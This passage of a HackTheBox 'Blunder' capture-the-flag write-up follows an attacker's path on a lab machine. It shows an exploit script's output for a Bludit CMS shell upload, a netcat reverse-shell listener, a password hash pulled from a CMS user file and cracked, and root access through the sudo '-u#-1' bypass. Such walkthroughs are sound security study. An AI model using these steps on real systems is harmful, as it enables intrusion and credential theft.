<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python CVE-2019-16113.py </span><br><span class="line">[+] Loggin successful.</span><br><span class="line">[+] Token CSRF: 20beeffb850557dccc6e3e67a3207f822c1fdbad</span><br><span class="line">[+] Shell upload succesful.</span><br><span class="line">[+] .htaccess upload succesful.</span><br><span class="line">[+] Command Execution successful.</span><br></pre></td></tr></table></figure>

<p>And a new connection appear on our listener:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.191:48860</span><br><span class="line">www-data@blunder:/$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>

<p>We now have a shell as <code>www-data</code>.</p>
<h3 id="Pivot-www-data-gt-hugo"><a href="#Pivot-www-data-gt-hugo" class="headerlink" title="Pivot www-data -&gt; hugo"></a>Pivot www-data -&gt; hugo</h3><p>Looking at the <code>/home/</code> folder we can see that <code>Hugo</code> hold the user flag. We need to find a way to pivot to his account:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@blunder:/$ ls -l /home/</span><br><span class="line">total 8</span><br><span class="line">drwxr-xr-x 16 hugo  hugo  4096 May 26 09:29 hugo</span><br><span class="line">drwxr-xr-x 16 shaun shaun 4096 Apr 28 12:13 shaun</span><br><span class="line">www-data@blunder:/$ ls -l /home/hugo</span><br><span class="line">-r-------- 1 hugo hugo   33 Jun 20 20:19 user.txt</span><br></pre></td></tr></table></figure>

<p>Searching for <code>Hugo</code> string returns an entry from <code>databases/users.php</code> file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@blunder:/var/www$ grep -ri <span class="string">&quot;hugo&quot;</span></span><br><span class="line">grep -ri <span class="string">&quot;hugo&quot;</span></span><br><span class="line">bludit-3.10.0a/bl-content/databases/users.php:        <span class="string">&quot;nickname&quot;</span>: <span class="string">&quot;Hugo&quot;</span>,</span><br><span class="line">bludit-3.10.0a/bl-content/databases/users.php:        <span class="string">&quot;firstName&quot;</span>: <span class="string">&quot;Hugo&quot;</span>,</span><br></pre></td></tr></table></figure>

<p>Let’s take a look at it:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">www-data@blunder:/var/www$ cat bludit-3.10.0a/bl-content/databases/users.php</span><br><span class="line">&lt;?php defined(<span class="string">&#x27;BLUDIT&#x27;</span>) or die(<span class="string">&#x27;Bludit CMS.&#x27;</span>); ?&gt;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;admin&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;nickname&quot;</span>: <span class="string">&quot;Hugo&quot;</span>,</span><br><span class="line">        <span class="string">&quot;firstName&quot;</span>: <span class="string">&quot;Hugo&quot;</span>,</span><br><span class="line">        <span class="string">&quot;lastName&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;role&quot;</span>: <span class="string">&quot;User&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;faca404fd5c0a31cf1897b823c695c85cffeb98d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;email&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;registered&quot;</span>: <span class="string">&quot;2019-11-27 07:40:55&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tokenRemember&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tokenAuth&quot;</span>: <span class="string">&quot;b380cb62057e9da47afce66b4615107d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tokenAuthTTL&quot;</span>: <span class="string">&quot;2009-03-15 14:00&quot;</span>,</span><br><span class="line">        <span class="string">&quot;twitter&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;facebook&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;instagram&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;codepen&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;linkedin&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;github&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;gitlab&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Bingo! We have what looks like a SHA1 hashed password. Unfortunately <code>john</code> can not seems to crack it:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt hugohash</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (Raw-SHA1 [SHA1 128/128 AVX 4x])</span><br><span class="line">Warning: no OpenMP support <span class="keyword">for</span> this <span class="built_in">hash</span> <span class="built_in">type</span>, consider --fork=2</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">0g 0:00:00:01 DONE (2020-06-20 21:42) 0g/s 12581Kp/s 12581Kc/s 12581KC/sie168..*7¡Vamos!</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>

<p>Being sure to be on the right track I checked online on <code>https://md5decrypt.net/en/Sha1/</code> website which managed to find it: <code>faca404fd5c0a31cf1897b823c695c85cffeb98d:Password120</code>.</p>
<p>Since SSH is not open let’s try to use <code>su</code> to change to <code>Hugo</code> user:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">www-data@blunder:/var/www$ su - hugo</span><br><span class="line">su - hugo</span><br><span class="line">Password: Password120</span><br><span class="line"></span><br><span class="line">hugo@blunder:~$ id</span><br><span class="line">uid=1001(hugo) gid=1001(hugo) groups=1001(hugo)</span><br><span class="line">hugo@blunder:~$ cat user.txt</span><br><span class="line">1xxxxxxxxxxxxxxxxxxxxx0</span><br></pre></td></tr></table></figure>

<h2 id="Root-FLag"><a href="#Root-FLag" class="headerlink" title="Root FLag"></a>Root FLag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>The first thing I like to check for privilege escalation to root is the <code>sudo</code> config. It’s very often a good entry-point. This box was no exception and got an interesting config I never saw before:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hugo@blunder:/$ sudo -l</span><br><span class="line">Password: Password120</span><br><span class="line">[...]</span><br><span class="line">User hugo may run the following commands on blunder:</span><br><span class="line">    (ALL, !root) /bin/bash</span><br></pre></td></tr></table></figure>

<p>This configuration of <code>sudo</code> is meant to allows a user to run a command as any user except root. Well that’s a bummer for what we need. </p>
<h3 id="Sudo-Exploit"><a href="#Sudo-Exploit" class="headerlink" title="Sudo Exploit"></a>Sudo Exploit</h3><p>Yet it’s worth digging a bit more because after a bit of search on this configuration we stumble upon <a target="_blank" rel="noopener" href="https://access.redhat.com/security/cve/cve-2019-14287">CVE-2019-14287</a>:</p>
<blockquote>
<p>A flaw was found in the way sudo implemented running commands with  arbitrary user ID. If a sudoers entry is written to allow the attacker  to run a command as any user except root, this flaw can be used by the  attacker to bypass that restriction.</p>
</blockquote>
<p>That’s exactly what we need. To summary, <code>sudo</code> check user ID being passed incorrectly and convert it to <code>-1</code>, or its unsigned equivalent <code>4294967295</code> user ID as <code>0</code>, which is always the user ID of root user. </p>
<p>Let’s see if the version running on the box is vulnerable:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hugo@blunder:/$ sudo -u<span class="comment">#-1 /bin/bash</span></span><br><span class="line">Password: Password120</span><br><span class="line"></span><br><span class="line">root@blunder:/<span class="comment"># cat /root/root.txt</span></span><br><span class="line">3xxxxxxxxxxxxxxxxxxxxd</span><br></pre></td></tr></table></figure>



<hr>
<p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p>
<p>See you next time ;)</p>
<p>-hg8</p>

  </div>
</article>
<br>
<br>


    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/HackTheBox/">HackTheBox</a> › <a class="category-link" href="/categories/CTF/HackTheBox/Easy-Box/">Easy Box</a>
    </div>



    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/Blunder/" rel="tag">Blunder</a>, <a class="tag-link-link" href="/tags/CVE-2019-14287/" rel="tag">CVE-2019-14287</a>, <a class="tag-link-link" href="/tags/CVE-2019-16113/" rel="tag">CVE-2019-16113</a>, <a class="tag-link-link" href="/tags/CVE-2019-17240/" rel="tag">CVE-2019-17240</a>, <a class="tag-link-link" href="/tags/SHA1/" rel="tag">SHA1</a>, <a class="tag-link-link" href="/tags/bludit-cms/" rel="tag">bludit cms</a>, <a class="tag-link-link" href="/tags/cewl/" rel="tag">cewl</a>, <a class="tag-link-link" href="/tags/htaccess/" rel="tag">htaccess</a>, <a class="tag-link-link" href="/tags/linux/" rel="tag">linux</a>, <a class="tag-link-link" href="/tags/sudo/" rel="tag">sudo</a>, <a class="tag-link-link" href="/tags/upload-restriction-bypass/" rel="tag">upload restriction bypass</a>
    </div>





        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Posts</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Brute-Force-Bludit-Admin-Account"><span class="toc-number">1.2.</span> <span class="toc-text">Brute Force Bludit Admin Account</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Remote-Code-Execution-via-Upload-Function"><span class="toc-number">1.3.</span> <span class="toc-text">Remote Code Execution via Upload Function</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-www-data-gt-hugo"><span class="toc-number">1.4.</span> <span class="toc-text">Pivot www-data -&gt; hugo</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-FLag"><span class="toc-number">2.</span> <span class="toc-text">Root FLag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sudo-Exploit"><span class="toc-number">2.2.</span> <span class="toc-text">Sudo Exploit</span></a></li></ol></li></ol>
    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2025
    <a href="https://hg8.sh">hg8.sh</a>
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


    
<script src="/lib/jquery/jquery.min.js"></script>


<script src="/js/main.js"></script>




</body>
</html>
